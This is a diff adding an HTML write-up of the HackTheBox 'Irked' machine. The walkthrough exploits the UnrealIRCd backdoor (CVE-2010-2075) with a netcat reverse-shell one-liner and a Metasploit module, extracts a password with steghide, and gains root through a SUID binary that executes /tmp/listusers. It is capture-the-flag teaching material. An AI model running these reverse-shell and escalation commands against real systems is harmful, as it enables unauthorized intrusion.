@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="../../../../../assets/css/articles.css">
+   <link rel="icon" type="image/png" href="/img/home/favicon.png" />
+   <title>irked.</title>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="breadcrumb">
+            <a href="/index-en.html">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                </svg>
+                Back
+            </a>
+        </nav>
+        <div class="header-controls">
+            <div class="language-toggle">
+                <a href="../../../../pt-br/writeups/hackthebox/machines/irked.html" title="Português (Brasil)">
+                    <svg viewBox="0 0 72 48" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="72" height="48" fill="#009c3b" />
+                        <polygon points="36,4 68,24 36,44 4,24" fill="#ffdf00" />
+                        <circle cx="36" cy="24" r="12" fill="#002776" />
+                        <path d="M24.5,21 Q36,28 47.5,21" stroke="#fff" stroke-width="2.5" fill="none" />
+                        <circle cx="30" cy="28" r="0.6" fill="#fff" />
+                        <circle cx="33" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="36" cy="31" r="0.6" fill="#fff" />
+                        <circle cx="39" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="42" cy="28" r="0.6" fill="#fff" />
+                    </svg>
+                </a>
+                <a href="../../../../en-us/writeups/hackthebox/machines/irked.html" class="active" title="English (US)">
+                    <svg viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="36" height="24" fill="#fff" />
+                        <rect width="36" height="1.85" y="0" fill="#b22234" />
+                        <rect width="36" height="1.85" y="3.7" fill="#b22234" />
+                        <rect width="36" height="1.85" y="7.4" fill="#b22234" />
+                        <rect width="36" height="1.85" y="11.1" fill="#b22234" />
+                        <rect width="36" height="1.85" y="14.8" fill="#b22234" />
+                        <rect width="36" height="1.85" y="18.5" fill="#b22234" />
+                        <rect width="36" height="1.85" y="22.2" fill="#b22234" />
+                        <rect width="14.4" height="12.95" fill="#3c3b6e" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+   <main class="content">
+      <header class="article-header">
+         <h1>Irked</h1>
+         <p class="meta">
+            HackTheBox &middot; Easy by <a href="https://www.linkedin.com/in/brennocm/">Brenno M.</a>
+         </p>
+      </header>
+      <section class="article-body writeup-body">
+         <p>Irked runs <b>UnrealIRCd 3.2.8.1</b> with the backdoor planted in the official package in 2009 (<b>CVE-2010-2075</b>). A password hidden with <b>steganography</b> leads to the user <i>djmardov</i>, and a <b>SUID</b> binary that runs a file from <i>/tmp</i> finishes off root.</p>
+
+         <figure class="attack-flow">
+            <figcaption>Attack path</figcaption>
+            <svg viewBox="0 0 660 176" role="img" aria-label="Attack path" xmlns="http://www.w3.org/2000/svg"><line x1="24" y1="32.0" x2="24" y2="52.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="78.0" x2="24" y2="98.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="124.0" x2="24" y2="144.0" stroke="#5c7a12" stroke-width="2"/><circle cx="24" cy="19.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="19.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">1</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="19.0">Reconnaissance</tspan></text><circle cx="24" cy="65.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="65.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">2</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="65.0">Exploitation - CVE-2010-2075</tspan></text><circle cx="24" cy="111.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="111.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">3</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="111.0">Lateral movement - steganography</tspan></text><circle cx="24" cy="157.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="157.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">4</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="157.0">Escalation - SUID viewuser</tspan></text></svg>
+         </figure>
+
+         <h2>Reconnaissance</h2>
+
+         <p>Besides SSH, Apache and rpcbind, UnrealIRCd listens on 6697, 8067 and 65534. The web page only shows an image and the note "IRC is almost working!".</p>
+
+         <pre class="code-block"><code>nmap -Pn -n -sT --min-rate 1500 -p- &lt;IP&gt;
+# 22, 80, 111, 6697, 8067, 46492, 65534
+nmap -Pn -n -sT -sV -sC -p22,80,111,6697,8067,65534 &lt;IP&gt;
+# 22 OpenSSH 6.7p1, 80 Apache 2.4.10, 6697/8067/65534 UnrealIRCd</code></pre>
+
+         <h2>Exploitation - CVE-2010-2075</h2>
+
+         <p>The UnrealIRCd 3.2.8.1 tarball distributed between 2009 and 2010 was swapped for a version that executes any message starting with <code>AB;</code>. One line is enough for a shell as <i>ircd</i>.</p>
+
+         <pre class="code-block"><code>nc -lvnp 4444
+echo &quot;AB; nc -e /bin/bash &lt;MY_IP&gt; 4444&quot; | nc &lt;IP&gt; 8067</code></pre>
+
+         <pre class="code-block"><code>msfconsole -q
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS &lt;IP&gt;
+set RPORT 65534
+set payload cmd/unix/reverse
+set LHOST tun0
+run</code></pre>
+
+         <h2>Lateral movement - steganography</h2>
+
+         <p>In <i>/home/djmardov/Documents</i>, <i>.backup</i> says "steg backup pw" and holds a password. The only image in sight is the site's <i>irked.jpg</i>, and <i>steghide</i> pulls <i>djmardov</i>'s SSH password out of it.</p>
+
+         <pre class="code-block"><code>cat /home/djmardov/Documents/.backup
+# Super elite steg backup pw
+# UPupDOWNdownLRlrBAbaSSss
+wget http://&lt;IP&gt;/irked.jpg
+steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+cat pass.txt
+ssh djmardov@&lt;IP&gt;
+cat ~/user.txt</code></pre>
+
+         <h2>Escalation - SUID viewuser</h2>
+
+         <p><i>/usr/bin/viewuser</i> is SUID root and not a standard binary. When run, it complains that <i>/tmp/listusers</i> does not exist: the program calls <code>setuid(0)</code> and executes that file. We just create it.</p>
+
+         <pre class="code-block"><code>find / -type f -perm -4000 2&gt;/dev/null
+/usr/bin/viewuser
+# sh: 1: /tmp/listusers: not found
+printf &#x27;/bin/sh&#x27; &gt; /tmp/listusers
+chmod +x /tmp/listusers
+/usr/bin/viewuser
+id   # uid=0(root)
+cat /root/root.txt</code></pre>
+      </section>
+   </main>
+   <br>
+   <footer>
+      <p>&copy; 20∞</p>
+   </footer>
+    <script src="../../../../../assets/js/article-toc.js" defer></script>
+</body>
+
+</html>
